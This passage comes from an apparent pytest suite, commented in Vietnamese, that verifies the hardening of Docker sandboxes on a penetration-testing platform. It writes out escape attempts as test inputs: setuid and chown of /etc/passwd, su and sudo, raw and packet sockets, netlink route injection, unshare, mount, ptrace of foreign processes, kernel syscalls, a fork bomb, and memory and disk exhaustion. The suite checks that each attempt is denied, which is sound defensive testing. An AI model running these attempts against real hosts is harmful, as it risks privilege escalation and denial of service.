            " for f in fs:\n  p=os.path.join(d,f)\n  try: m=os.lstat(p).st_mode\n  except OSError: continue\n"
            "  if stat.S_ISREG(m) and m & (stat.S_ISUID|stat.S_ISGID): bad.append(p)\nprint('SUID', bad)")
    assert sx(sb.a, find)[1] == "SUID []"
    # control: quét thấy cả file thường (chương trình đếm được > 100 file) — tránh kết luận từ một walk rỗng
    assert int(sx(sb.a, "import os; print(sum(len(f) for _,_,f in os.walk('/usr')))")[1]) > 100
    for attempt in ("os.setuid(0)", "os.seteuid(0)", "os.setgid(0)", "os.setgroups([0])", "os.chown('/etc/passwd',10002,10002)", "os.chroot('/tmp')"):
        res = sx(sb.a, "import os\ntry:\n %s; print('SUCCEEDED')\nexcept OSError as e: print('DENIED', type(e).__name__)" % attempt)[1]
        assert res.startswith("DENIED"), (attempt, res)
    assert sx(sb.a, "import subprocess; print(subprocess.run(['id','-u'],capture_output=True,text=True).stdout.strip())")[1] == "10002"   # control
    res = sx(sb.a, "import subprocess\nr=subprocess.run(['su','-c','id -u','root'],capture_output=True,text=True,input='\\n',timeout=20); print(r.returncode, r.stdout.strip())")[1]
    assert not res.endswith(" 0") and res.split()[0] != "0", res                # su (không setuid) không lên được root
    res = sx(sb.a, "import subprocess\nfor b in ('sudo','doas','pkexec'):\n r=subprocess.run(['/usr/bin/env','which',b],capture_output=True); print(b, r.returncode)")[1]
    assert all(ln.endswith("1") for ln in res.splitlines()), res


# ───────────────────────── 10. ptrace / raw sockets / namespace & kernel escapes ─────────────────────────
@needs_lab
def test_ptrace_raw_sockets_and_namespace_escapes_denied(lab, sb):
    assert stcp(sb.a, lab.ip1, 80) == "OPEN"                                 # control: AF_INET TCP socket tạo & dùng được
    def sock(fam, typ, proto=0):
        return sx(sb.a, "import socket\ntry: socket.socket(%s,%s,%s); print('OK')\nexcept OSError as e: print('DENIED', type(e).__name__)" % (fam, typ, proto))[1]
    assert sock("socket.AF_INET", "socket.SOCK_DGRAM") == "OK"               # control: UDP socket thường tạo được
    assert sock("socket.AF_INET", "socket.SOCK_RAW", 6).startswith("DENIED")
    assert sock("socket.AF_INET", "socket.SOCK_RAW", 255).startswith("DENIED")
    assert sock("socket.AF_PACKET", "socket.SOCK_RAW", 0x0300).startswith("DENIED")   # sniff/inject L2 (ARP spoof)
    assert sock("socket.AF_INET6", "socket.SOCK_RAW", 58).startswith("DENIED")
    # netlink: đọc route được (control) nhưng KHÔNG thêm/sửa route/ARP (cần CAP_NET_ADMIN)
    nl = ("import socket,struct\ns=socket.socket(socket.AF_NETLINK,socket.SOCK_RAW,0); s.bind((0,0))\n"
          "RTM_NEWROUTE,F=24,(0x1|0x4|0x400|0x200)\nrtm=struct.pack('BBBBBBBBI',2,0,0,0,254,3,1,1,0)\n"
          "attrs=struct.pack('HH4s',8,1,bytes([8,8,8,8]))+struct.pack('HH4s',8,4,bytes([127,0,0,1]))\n"
          "msg=rtm+attrs; hdr=struct.pack('IHHII',16+len(msg),RTM_NEWROUTE,F,1,0)\ns.send(hdr+msg)\nd=s.recv(4096)\n"
          "err=struct.unpack('i',d[16:20])[0]\nprint('NLERR',-err)")
    assert sx(sb.a, nl)[1] == "NLERR 1"                                      # EPERM
    libc = "import ctypes,os\nlibc=ctypes.CDLL(None,use_errno=True)\n"
    ns = libc + "r=libc.unshare(%d)\nprint('OK' if r==0 else 'DENIED', ctypes.get_errno())"
    for name, flag in (("NEWNET", 0x40000000), ("NEWUSER", 0x10000000), ("NEWNS", 0x00020000)):
        assert sx(sb.a, ns % flag)[1].startswith("DENIED"), name
    assert sx(sb.a, libc + "r=libc.mount(b'none',b'/tmp',b'tmpfs',0,None)\nprint('OK' if r==0 else 'DENIED', ctypes.get_errno())")[1].startswith("DENIED")
    # ptrace: control = attach được vào CON của chính mình (cùng uid, cùng pid ns → hợp lệ). attack = mọi PID KHÔNG nằm trong /proc của sandbox
    # (tiến trình của sandbox khác / của host: khác pid namespace) đều không với tới được (ESRCH/EPERM). Attach vào tiến trình cùng sandbox
    # (kể cả PID 1) là hợp lệ và nằm trong ranh giới sandbox, nên không kiểm là "bị chặn".
    pt = libc + ("import subprocess\nPTRACE_ATTACH,PTRACE_DETACH=16,17\nc=subprocess.Popen(['/bin/sleep','30'])\n"
                 "libc.ptrace.argtypes=[ctypes.c_long,ctypes.c_long,ctypes.c_void_p,ctypes.c_void_p]\n"
                 "r_child=libc.ptrace(PTRACE_ATTACH,c.pid,None,None)\nos.waitpid(c.pid,0)\nlibc.ptrace(PTRACE_DETACH,c.pid,None,None)\n"
                 "mine={int(d) for d in os.listdir('/proc') if d.isdigit()}\nleaked=[p for p in range(2,4096) if p not in mine and libc.ptrace(PTRACE_ATTACH,p,None,None)==0]\n"
                 "c.kill()\nprint('CHILD', r_child, 'LEAKED', leaked)")
    out = sx(sb.a, pt)[1]
    assert out == "CHILD 0 LEAKED []", out
    # process_vm_readv/keyctl/bpf/perf_event_open/userfaultfd/kexec: seccomp mặc định của docker từ chối
    nr = {"x86_64": {"bpf": 321, "keyctl": 250, "perf_event_open": 298, "kexec_load": 246, "init_module": 175},
          "aarch64": {"bpf": 280, "keyctl": 219, "perf_event_open": 241, "kexec_load": 104, "init_module": 105}}[sx(sb.a, "import platform; print(platform.machine())")[1]]
    for sysname in ("bpf", "keyctl", "perf_event_open", "kexec_load", "init_module"):
        call = "libc.syscall(%d,0,0,0,0,0)" % nr[sysname]
        res = sx(sb.a, libc + "r=%s\nprint(r, ctypes.get_errno())" % call)[1]
        assert res.split()[0] == "-1" and res.split()[1] in ("1", "38", "13"), (sysname, res)   # EPERM / ENOSYS / EACCES


# ───────────────────────── 11. giới hạn tài nguyên ─────────────────────────
@needs_lab
def test_container_spec_hardening(lab, sb):
    hc, cfg = sb.a.attrs["HostConfig"], sb.a.attrs["Config"]
    assert hc["ReadonlyRootfs"] is True and hc["Privileged"] is False
    assert hc["CapDrop"] == ["ALL"] and not hc.get("CapAdd")
    assert "no-new-privileges:true" in (hc["SecurityOpt"] or [])
    assert hc["PidsLimit"] == 512 and hc["Memory"] == 2048 * 1024 * 1024 and hc["NanoCpus"] == 2_000_000_000
    assert hc["NetworkMode"] == f"vg-eng-{lab.eid}" and not hc.get("PidMode") and not hc.get("IpcMode") in ("host",) and not hc.get("UsernsMode")
    assert not hc.get("Binds") and not hc.get("Devices") and not hc.get("ExtraHosts") and hc.get("Runtime") in ("runc", "runsc", "", None)
    assert cfg["User"] == UID
    assert "/tmp" in hc["Tmpfs"] and "/work" in hc["Tmpfs"] and "size=" in hc["Tmpfs"]["/work"]
    assert hc.get("SecurityOpt") is not None and not any("unconfined" in s for s in hc["SecurityOpt"])   # seccomp/apparmor mặc định, không unconfined
    # control hiệu lực thật: cgroup pids.max khớp
    _, pmax = sx(sb.a, "import os\nfor p in ('/sys/fs/cgroup/pids.max','/sys/fs/cgroup/pids/pids.max'):\n if os.path.exists(p): print(open(p).read().strip()); break\nelse: print('n/a')")
    assert pmax in ("512", "n/a"), pmax


@needs_lab
def test_fork_bomb_is_capped_by_pids_limit(lab):
    rid = "fb" + lab.uid
    c = _create_sandbox(lab, rid, limits={"pids": 32, "mem_mb": 256})
    try:
        code = ("import os,time,signal\nkids=[]\nerr=None\n"
                "for i in range(400):\n try:\n  pid=os.fork()\n except OSError as e:\n  err=e.errno; break\n"
                "  \n"
                " if pid==0:\n  time.sleep(20); os._exit(0)\n kids.append(pid)\n"
                "for k in kids:\n try: os.kill(k, signal.SIGKILL)\n except OSError: pass\n"
                "for k in kids:\n try: os.waitpid(k,0)\n except OSError: pass\nprint('FORKED', len(kids), 'ERRNO', err)")
        code = code.replace("  \n", "")
        out = sx(c, code)[1]
        assert out.startswith("FORKED"), out
        n, errno_ = int(out.split()[1]), out.split()[3]
        assert 0 < n < 32 and errno_ == "11", out                              # control: fork chạy được (n>0) rồi chạm trần pids (EAGAIN)
        assert sx(c, "print('alive')")[1] == "alive"                           # sandbox còn sống sau "bom"; gateway/lab không bị ảnh hưởng
        assert stcp(c, lab.ip1, 80) == "OPEN"
    finally:
        lab.http.delete(f"/v1/runs/{rid}/sandbox", headers=H)


@needs_lab
def test_memory_and_disk_limits_enforced(lab):
    rid = "ml" + lab.uid
    c = _create_sandbox(lab, rid, limits={"mem_mb": 128, "work_mb": 64, "pids": 64})
    try:
        ok = sx(c, "b=bytearray(32*1024*1024); b[::4096]=b'\\x01'*len(b[::4096]); print('ALLOC-OK')")[1]
        assert ok == "ALLOC-OK"                                                # control: cấp phát dưới trần chạy được
        rc, out = sx(c, "b=bytearray(); \nwhile True:\n b.extend(b'\\x01'*(8*1024*1024))")
        assert rc != 0 and "ALLOC" not in out                                  # vượt trần 128 MB → OOM-kill tiến trình (SIGKILL → 137) / MemoryError
        c.reload()
        assert c.status == "running" and sx(c, "print('alive')")[1] == "alive"  # container sống; chỉ tiến trình vượt trần bị giết
        # đĩa: /work (tmpfs 64 MB) đầy → ENOSPC; control: ghi 1 MB trước đó OK
        assert sx(c, "open('/work/small','wb').write(b'x'*(1<<20)); print('SMALL-OK')")[1] == "SMALL-OK"
        out = sx(c, "import errno\ntry:\n f=open('/work/big','wb')\n for _ in range(200): f.write(b'x'*(1<<20)); f.flush()\n print('NO-LIMIT')\n"
                    "except OSError as e: print('ERRNO', errno.errorcode[e.errno])")[1]
        assert out == "ERRNO ENOSPC", out
        # /tmp (tmpfs 256 MB) tính vào trần bộ nhớ 128 MB của cgroup → ghi dồn bị chặn bằng ENOSPC hoặc OOM-kill; sandbox vẫn sống
        rc, out = sx(c, "import errno\ntry:\n f=open('/tmp/big','wb')\n for _ in range(400): f.write(b'x'*(1<<20)); f.flush()\n print('NO-LIMIT')\n"
                        "except OSError as e: print('ERRNO', errno.errorcode[e.errno])")
        assert out in ("ERRNO ENOSPC", "") and out != "NO-LIMIT", (rc, out)
        lab.gwc.reload()
        assert lab.gwc.status == "running"                                     # sự cố giới hạn trong sandbox: gateway/lab không bị ảnh hưởng
    finally:
        lab.http.delete(f"/v1/runs/{rid}/sandbox", headers=H)


@needs_lab
def test_sandbox_cold_start_under_5s_p50(lab):
    """Cold start = POST /sandbox → exec đầu tiên chạy được (gồm tạo container + attach route gateway). p50 < 5s (N=VG_COLDSTART_RUNS, mặc định 10)."""
    n = int(os.environ.get("VG_COLDSTART_RUNS", "10"))
    times = []
    for i in range(n):
        rid = f"cs{i}{lab.uid}"
        t0 = time.monotonic()
        c = _create_sandbox(lab, rid)
        try:
            assert sx(c, "print('up')")[1] == "up"
            times.append(time.monotonic() - t0)
        finally:
            lab.http.delete(f"/v1/runs/{rid}/sandbox", headers=H)
    p50 = statistics.median(times)
    p95 = sorted(times)[max(0, int(round(0.95 * len(times))) - 1)]
    rep = {"runs": n, "p50_s": round(p50, 3), "p95_s": round(p95, 3), "max_s": round(max(times), 3), "samples_s": [round(t, 3) for t in times]}
    print("sandbox cold start:", rep)
    try:
        out = pathlib.Path(os.environ.get("VG_EVAL_OUT", "eval/out"))
        out.mkdir(parents=True, exist_ok=True)
        (out / "sandbox_coldstart.json").write_text(json.dumps(rep, indent=2))
    except OSError:
        pass
    assert p50 < 5.0, rep


# ───────────────────────── 12. cô lập giữa các sandbox ─────────────────────────
@needs_lab
def test_cross_engagement_sandbox_unreachable(lab, sb):
    # sandbox A (engagement chính) → sandbox C (engagement khác): control = A chạm target in-scope, C chạm target của nó
    assert stcp(sb.a, lab.ip1, 80) == "OPEN"
    assert stcp(sb.c, lab.ip3, 80) == "OPEN"
    # lắng nghe trong C rồi A thử kết nối: phải KHÔNG tới
    listener = lab.cli.containers.run(RUNNER_IMG, entrypoint=["python3", "-c", "import socket,time\ns=socket.socket(); s.bind(('0.0.0.0',7777)); s.listen(8)\ns.settimeout(0.5)\nend=time.time()+60\nn=0\n"
                                      "while time.time()<end:\n try: s.accept()[0].close(); print('CONN',flush=True)\n except OSError: pass"],
                                      network=f"vg-eng-{sb.eid2}", detach=True, labels={"vgt": lab.uid, "vulnguard.eng": sb.eid2})
    try:
        listener.reload()
        lip = listener.attrs["NetworkSettings"]["Networks"][f"vg-eng-{sb.eid2}"]["IPAddress"]
        time.sleep(1)
        assert sx(sb.c, "import socket\ns=socket.socket(); s.settimeout(3); s.connect(('%s',7777)); print('OPEN')" % lip)[1] == "OPEN"   # control: cùng mạng chạm được
        for target in (lip, sb.c_ip):
            for port in (7777, 22, 8080):
                assert blocked(stcp(sb.a, target, port, 3)), (target, port)
        time.sleep(0.5)
        assert listener.logs().decode().count("CONN") == 1                      # chỉ kết nối control của C; A không bao giờ tới
    finally:
        listener.remove(force=True)
    assert blocked(stcp(sb.c, sb.a_ip, 22, 3))                                  # chiều ngược lại cũng bị chặn


@needs_lab
def test_other_sandbox_filesystem_and_processes_invisible(lab, sb):
    assert sx(sb.a, "open('/work/marker-a','w').write('A'); print('ok')")[1] == "ok"
    assert sx(sb.a, "import os; print(os.path.exists('/work/marker-a'))")[1] == "True"        # control: A thấy marker của chính nó
    assert sx(sb.b, "import os; print(os.path.exists('/work/marker-a'))")[1] == "False"       # B (cùng engagement) KHÔNG thấy /work của A
    assert sx(sb.c, "import os; print(os.path.exists('/work/marker-a'))")[1] == "False"
    pids_a = set(sx(sb.a, "import os; print(' '.join(d for d in os.listdir('/proc') if d.isdigit()))")[1].split())
    assert "1" in pids_a                                                       # control: thấy PID 1 của chính mình
    for other in (sb.b, sb.c):
        cmd = sx(other, "print(open('/proc/1/cmdline','rb').read().replace(b'\\0',b' ').decode())")[1]
        assert "vg-exec" in cmd or "idle" in cmd
    # tiến trình của B không hiện trong /proc của A (khác pid namespace): so sánh sandbox-unique argv
    sx(sb.b, "import subprocess; subprocess.Popen(['/bin/sleep','47'])")
    hit = sx(sb.a, "import os\nfor d in os.listdir('/proc'):\n if d.isdigit():\n  try:\n   if b'sleep\\x0047' in open('/proc/%s/cmdline'%d,'rb').read(): print('SEEN')\n  except OSError: pass\nprint('DONE')")[1]
    assert hit == "DONE"
    top = sb.b.top()
    assert any("sleep" in " ".join(p) for p in top["Processes"])               # control: tiến trình đó có thật ở B (nhìn từ daemon)


@needs_lab
def test_same_engagement_sandbox_to_sandbox(lab, sb):
    """Hai sandbox của CÙNG engagement dùng chung một bridge. Docker cho L2 giữa chúng đi thẳng, không qua gateway/nft. Ghi nhận rõ hành vi
    hiện tại để eval KHÔNG im lặng: nếu runner đóng đường này (vd. mỗi sandbox một /32 + isolation) test này sẽ yêu cầu cập nhật."""
    listener = ("import socket,threading,time\ns=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); s.bind(('0.0.0.0',7788)); s.listen(8)\n"
                "threading.Thread(target=lambda: [s.accept()[0].close() for _ in range(5)], daemon=True).start(); time.sleep(8)")
    sb.b.exec_run(["python3", "-c", listener], user=UID, detach=True)
    time.sleep(1)
    res = stcp(sb.a, sb.b_ip, 7788, 3)
    # Ngoài scope? sandbox B nằm trong cùng engagement (cùng scope) nên không phải leo thang quyền scope, nhưng B không phải mục tiêu: ghi nhận
    pytest.xfail(f"KNOWN GAP (follow-up): sandbox↔sandbox cùng engagement qua bridge chung = {res}") if res == "OPEN" else None
    assert blocked(res)
